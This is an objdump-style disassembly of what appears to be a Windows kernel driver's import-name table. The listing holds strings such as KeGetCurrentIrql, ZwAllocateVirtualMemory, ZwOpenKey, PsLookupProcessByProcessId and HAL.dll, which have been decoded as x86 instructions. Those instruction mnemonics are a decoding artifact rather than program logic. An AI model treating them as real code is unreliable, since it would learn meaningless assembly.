   15797:	6c                   	insb   (%dx),%es:(%edi)
   15798:	2e 65 78 65          	cs js,pn 0x15801
   1579c:	00 00                	add    %al,(%eax)
   1579e:	44                   	inc    %esp
   1579f:	00 4b 65             	add    %cl,0x65(%ebx)
   157a2:	47                   	inc    %edi
   157a3:	65 74 43             	gs je  0x157e9
   157a6:	75 72                	jne    0x1581a
   157a8:	72 65                	jb     0x1580f
   157aa:	6e                   	outsb  %ds:(%esi),(%dx)
   157ab:	74 49                	je     0x157f6
   157ad:	72 71                	jb     0x15820
   157af:	6c                   	insb   (%dx),%es:(%edi)
   157b0:	00 00                	add    %al,(%eax)
   157b2:	4f                   	dec    %edi
   157b3:	00 4b 66             	add    %cl,0x66(%ebx)
   157b6:	41                   	inc    %ecx
   157b7:	63 71 75             	arpl   %esi,0x75(%ecx)
   157ba:	69 72 65 53 70 69 6e 	imul   $0x6e697053,0x65(%edx),%esi
   157c1:	4c                   	dec    %esp
   157c2:	6f                   	outsl  %ds:(%esi),(%dx)
   157c3:	63 6b 00             	arpl   %ebp,0x0(%ebx)
   157c6:	52                   	push   %edx
   157c7:	00 4b 66             	add    %cl,0x66(%ebx)
   157ca:	52                   	push   %edx
   157cb:	65 6c                	gs insb (%dx),%es:(%edi)
   157cd:	65 61                	gs popa
   157cf:	73 65                	jae    0x15836
   157d1:	53                   	push   %ebx
   157d2:	70 69                	jo     0x1583d
   157d4:	6e                   	outsb  %ds:(%esi),(%dx)
   157d5:	4c                   	dec    %esp
   157d6:	6f                   	outsl  %ds:(%esi),(%dx)
   157d7:	63 6b 00             	arpl   %ebp,0x0(%ebx)
   157da:	48                   	dec    %eax
   157db:	41                   	inc    %ecx
   157dc:	4c                   	dec    %esp
   157dd:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
   157e0:	6c                   	insb   (%dx),%es:(%edi)
   157e1:	00 1b                	add    %bl,(%ebx)
   157e3:	04 5a                	add    $0x5a,%al
   157e5:	77 41                	ja     0x15828
   157e7:	6c                   	insb   (%dx),%es:(%edi)
   157e8:	6c                   	insb   (%dx),%es:(%edi)
   157e9:	6f                   	outsl  %ds:(%esi),(%dx)
   157ea:	63 61 74             	arpl   %esp,0x74(%ecx)
   157ed:	65 56                	gs push %esi
   157ef:	69 72 74 75 61 6c 4d 	imul   $0x4d6c6175,0x74(%edx),%esi
   157f6:	65 6d                	gs insl (%dx),%es:(%edi)
   157f8:	6f                   	outsl  %ds:(%esi),(%dx)
   157f9:	72 79                	jb     0x15874
   157fb:	00 c7                	add    %al,%bh
   157fd:	01 4b 65             	add    %ecx,0x65(%ebx)
   15800:	49                   	dec    %ecx
   15801:	6e                   	outsb  %ds:(%esi),(%dx)
   15802:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
   15809:	65 
   1580a:	4d                   	dec    %ebp
   1580b:	75 74                	jne    0x15881
   1580d:	65 78 00             	gs js  0x15810
   15810:	e9 01 4b 65 52       	jmp    0x5266a316
   15815:	65 6c                	gs insb (%dx),%es:(%edi)
   15817:	65 61                	gs popa
   15819:	73 65                	jae    0x15880
   1581b:	4d                   	dec    %ebp
   1581c:	75 74                	jne    0x15892
   1581e:	65 78 00             	gs js  0x15821
   15821:	00 14 02             	add    %dl,(%edx,%eax,1)
   15824:	4b                   	dec    %ebx
   15825:	65 57                	gs push %edi
   15827:	61                   	popa
   15828:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
   1582f:	6e 
   15830:	67 6c                	insb   (%dx),%es:(%di)
   15832:	65 4f                	gs dec %edi
   15834:	62 6a 65             	bound  %ebp,0x65(%edx)
   15837:	63 74 00 59          	arpl   %esi,0x59(%eax,%eax,1)
   1583b:	04 5a                	add    $0x5a,%al
   1583d:	77 51                	ja     0x15890
   1583f:	75 65                	jne    0x158a6
   15841:	72 79                	jb     0x158bc
   15843:	56                   	push   %esi
   15844:	61                   	popa
   15845:	6c                   	insb   (%dx),%es:(%edi)
   15846:	75 65                	jne    0x158ad
   15848:	4b                   	dec    %ebx
   15849:	65 79 00             	gs jns 0x1584c
   1584c:	40                   	inc    %eax
   1584d:	04 5a                	add    $0x5a,%al
   1584f:	77 4f                	ja     0x158a0
   15851:	70 65                	jo     0x158b8
   15853:	6e                   	outsb  %ds:(%esi),(%dx)
   15854:	4b                   	dec    %ebx
   15855:	65 79 00             	gs jns 0x15858
   15858:	89 04 5f             	mov    %eax,(%edi,%ebx,2)
   1585b:	73 74                	jae    0x158d1
   1585d:	72 69                	jb     0x158c8
   1585f:	63 6d 70             	arpl   %ebp,0x70(%ebp)
   15862:	00 00                	add    %al,(%eax)
   15864:	43                   	inc    %ebx
   15865:	02 4d 6d             	add    0x6d(%ebp),%cl
   15868:	47                   	inc    %edi
   15869:	65 74 53             	gs je  0x158bf
   1586c:	79 73                	jns    0x158e1
   1586e:	74 65                	je     0x158d5
   15870:	6d                   	insl   (%dx),%es:(%edi)
   15871:	52                   	push   %edx
   15872:	6f                   	outsl  %ds:(%esi),(%dx)
   15873:	75 74                	jne    0x158e9
   15875:	69 6e 65 41 64 64 72 	imul   $0x72646441,0x65(%esi),%ebp
   1587c:	65 73 73             	gs jae 0x158f2
   1587f:	00 da                	add    %bl,%dl
   15881:	02 50 73             	add    0x73(%eax),%dl
   15884:	47                   	inc    %edi
   15885:	65 74 56             	gs je  0x158de
   15888:	65 72 73             	gs jb  0x158fe
   1588b:	69 6f 6e 00 00 50 04 	imul   $0x4500000,0x6e(%edi),%ebp
   15892:	5a                   	pop    %edx
   15893:	77 51                	ja     0x158e6
   15895:	75 65                	jne    0x158fc
   15897:	72 79                	jb     0x15912
   15899:	49                   	dec    %ecx
   1589a:	6e                   	outsb  %ds:(%esi),(%dx)
   1589b:	66 6f                	outsw  %ds:(%esi),(%dx)
   1589d:	72 6d                	jb     0x1590c
   1589f:	61                   	popa
   158a0:	74 69                	je     0x1590b
   158a2:	6f                   	outsl  %ds:(%esi),(%dx)
   158a3:	6e                   	outsb  %ds:(%esi),(%dx)
   158a4:	50                   	push   %eax
   158a5:	72 6f                	jb     0x15916
   158a7:	63 65 73             	arpl   %esp,0x73(%ebp)
   158aa:	73 00                	jae    0x158ac
   158ac:	b5 02                	mov    $0x2,%ch
   158ae:	4f                   	dec    %edi
   158af:	62 4f 70             	bound  %ecx,0x70(%edi)
   158b2:	65 6e                	outsb  %gs:(%esi),(%dx)
   158b4:	4f                   	dec    %edi
   158b5:	62 6a 65             	bound  %ebp,0x65(%edx)
   158b8:	63 74 42 79          	arpl   %esi,0x79(%edx,%eax,2)
   158bc:	50                   	push   %eax
   158bd:	6f                   	outsl  %ds:(%esi),(%dx)
   158be:	69 6e 74 65 72 00 df 	imul   $0xdf007265,0x74(%esi),%ebp
   158c5:	02 50 73             	add    0x73(%eax),%dl
   158c8:	4c                   	dec    %esp
   158c9:	6f                   	outsl  %ds:(%esi),(%dx)
   158ca:	6f                   	outsl  %ds:(%esi),(%dx)
   158cb:	6b 75 70 50          	imul   $0x50,0x70(%ebp),%esi
   158cf:	72 6f                	jb     0x15940
   158d1:	63 65 73             	arpl   %esp,0x73(%ebp)
   158d4:	73 42                	jae    0x15918
   158d6:	79 50                	jns    0x15928
   158d8:	72 6f                	jb     0x15949
   158da:	63 65 73             	arpl   %esp,0x73(%ebp)
   158dd:	73 49                	jae    0x15928
   158df:	64 00 00             	add    %al,%fs:(%eax)
   158e2:	bd 02 4f 62 66       	mov    $0x66624f02,%ebp
   158e7:	44                   	inc    %esp
   158e8:	65 72 65             	gs jb  0x15950
   158eb:	66 65 72 65          	data16 gs jb 0x15954
   158ef:	6e                   	outsb  %ds:(%esi),(%dx)
   158f0:	63 65 4f             	arpl   %esp,0x4f(%ebp)
   158f3:	62 6a 65             	bound  %ebp,0x65(%edx)
   158f6:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
   158fa:	a2 04 6d 65 6d       	mov    %al,0x6d656d04
   158ff:	63 70 79             	arpl   %esi,0x79(%eax)
   15902:	00 00                	add    %al,(%eax)
   15904:	81 04 5f 65 78 63 65 	addl   $0x65637865,(%edi,%ebx,2)
   1590b:	70 74                	jo     0x15981
   1590d:	5f                   	pop    %edi
   1590e:	68 61 6e 64 6c       	push   $0x6c646e61
   15913:	65 72 33             	gs jb  0x15949
   15916:	00 00                	add    %al,(%eax)
   15918:	a4                   	movsb  %ds:(%esi),%es:(%edi)
   15919:	04 6d                	add    $0x6d,%al
   1591b:	65 6d                	gs insl (%dx),%es:(%edi)
   1591d:	73 65                	jae    0x15984
   1591f:	74 00                	je     0x15921
	...
